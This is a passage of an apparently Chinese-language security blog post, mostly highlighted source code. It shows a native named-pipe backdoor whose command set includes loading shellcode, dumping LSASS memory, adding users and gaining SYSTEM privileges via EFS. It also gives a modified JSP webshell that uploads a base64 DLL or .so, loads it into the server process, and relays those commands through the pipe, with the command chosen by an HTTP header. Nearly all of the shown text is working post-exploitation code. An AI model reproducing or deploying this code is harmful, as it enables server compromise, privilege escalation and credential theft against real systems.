</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                ZeroMemory(szBuffer, BUFF_SIZE);
</span></span><span style=display:flex><span>                ReadFile(hPipe, szBuffer, BUFF_SIZE, <span style=color:#f92672>&amp;</span>dwLen, NULL);
</span></span><span style=display:flex><span>                g_ShellcodeBuffer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span>[dwLen];
</span></span><span style=display:flex><span>                RtlCopyMemory(g_ShellcodeBuffer, szBuffer, dwLen);
</span></span><span style=display:flex><span>                g_dwShellcodeSize <span style=color:#f92672>=</span> dwLen;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_UNSET_SYSTEM_SHELLCODE:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 清空全局Shellcode
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：system-uncode
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                g_dwShellcodeSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                g_ShellcodeBuffer <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 关闭连接
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            DisconnectNamedPipe(hPipe);
</span></span><span style=display:flex><span>        }
</span></span></code></pre></td></tr></table></div></div><p>METHOD开头的常量代表了不同的功能：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#define PIPE_NAME L&#34;\\\\.\\pipe\\josPipe&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define BUFF_SIZE 1024
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define METHOD_WMI_CREATE_PROCESS 0x00 </span><span style=color:#75715e>// WMIC 创建进程
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define METHOD_SHELL_CODE_LOADE 0x01  </span><span style=color:#75715e>// SHELLCODE 加载
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define METHOD_MINIDUMP_LSASS 0x02   </span><span style=color:#75715e>// 转储Lsass.exe
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define METHOD_ADD_USER 0x03  </span><span style=color:#75715e>// 添加用户
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define METHOD_GETSYSTEM 0x04  </span><span style=color:#75715e>// 利用EFS获取SYSTEM的Token
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define METHOD_SYSTEM_EXECUTE 0x05 </span><span style=color:#75715e>// 以SYSTEM权限执行命令
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define METHOD_SET_SYSTEM_SHELLCODE 0x07 </span><span style=color:#75715e>// 设置Shellcode
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define METHOD_UNSET_SYSTEM_SHELLCODE 0x08 </span><span style=color:#75715e>// 取消设置Shellcode
</span></span></span></code></pre></td></tr></table></div></div><p>Java Webshell的改造代码如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span> page import<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;java.io.RandomAccessFile&#34;</span> <span style=color:#f92672>%&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;%!</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String getFileName(){
</span></span><span style=display:flex><span>        String fileName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        java.util.Random random <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.util.Random(System.currentTimeMillis());
</span></span><span style=display:flex><span>        String os <span style=color:#f92672>=</span> System.getProperty(<span style=color:#e6db74>&#34;os.name&#34;</span>).toLowerCase();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (os.contains(<span style=color:#e6db74>&#34;windows&#34;</span>)){
</span></span><span style=display:flex><span>            fileName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Temp</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> random.nextInt(<span style=color:#ae81ff>10000000</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.dll&#34;</span>;
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            fileName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/&#34;</span><span style=color:#f92672>+</span> random.nextInt(<span style=color:#ae81ff>10000000</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.so&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> fileName;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>UploadBase64DLL</span>(java.io.InputStream stream) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        sun.misc.BASE64Decoder b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> sun.misc.BASE64Decoder();
</span></span><span style=display:flex><span>        java.io.File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.io.File(getFileName());
</span></span><span style=display:flex><span>        java.io.FileOutputStream fos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.io.FileOutputStream(file);
</span></span><span style=display:flex><span>        fos.write(b.decodeBuffer(stream));
</span></span><span style=display:flex><span>        fos.close();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> file.getAbsolutePath();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>RuntimeLoad</span>(String path){
</span></span><span style=display:flex><span>        Runtime.getRuntime().load(path);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>SystemLoad</span>(String path){
</span></span><span style=display:flex><span>        System.load(path);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>NativeLoad</span>(String path) <span style=color:#66d9ef>throws</span> Exception{
</span></span><span style=display:flex><span>        Class Native <span style=color:#f92672>=</span> Class.forName(<span style=color:#e6db74>&#34;com.sun.glass.utils.NativeLibLoader&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(Native <span style=color:#f92672>!=</span> null){
</span></span><span style=display:flex><span>            java.lang.reflect.Method Load <span style=color:#f92672>=</span> Native.getDeclaredMethod(<span style=color:#e6db74>&#34;loadLibrary&#34;</span>,String.<span style=color:#66d9ef>class</span><span style=color:#960050;background-color:#1e0010>);</span>
</span></span><span style=display:flex><span>            Load.invoke(path);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span><span style=color:#75715e>//&lt;/jsp:declaration&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>%&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;%</span>
</span></span><span style=display:flex><span>    String pipeName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>.</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>pipe</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>josPipe&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>{
</span></span><span style=display:flex><span>        String method <span style=color:#f92672>=</span> request.getHeader(<span style=color:#e6db74>&#34;WWW-Authenticate&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(method <span style=color:#f92672>==</span> null){
</span></span><span style=display:flex><span>            out.println(<span style=color:#e6db74>&#34;Start&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (method.equals(<span style=color:#e6db74>&#34;load&#34;</span>)){
</span></span><span style=display:flex><span>            ServletInputStream stream <span style=color:#f92672>=</span> request.getInputStream();
</span></span><span style=display:flex><span>            String file <span style=color:#f92672>=</span>  UploadBase64DLL(stream);
</span></span><span style=display:flex><span>            RuntimeLoad(file);
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;dump&#34;</span>)){
</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x02</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(pipe.readByte() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x01</span>){
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;OK&#34;</span>);
</span></span><span style=display:flex><span>            }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;Failed&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;process&#34;</span>)){
</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x00</span>);
</span></span><span style=display:flex><span>            pipe.write(request.getHeader(<span style=color:#e6db74>&#34;Content-Method&#34;</span>).getBytes());
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(pipe.readByte() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x01</span>){
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;OK&#34;</span>);
</span></span><span style=display:flex><span>            }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;Failed&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;user&#34;</span>)){
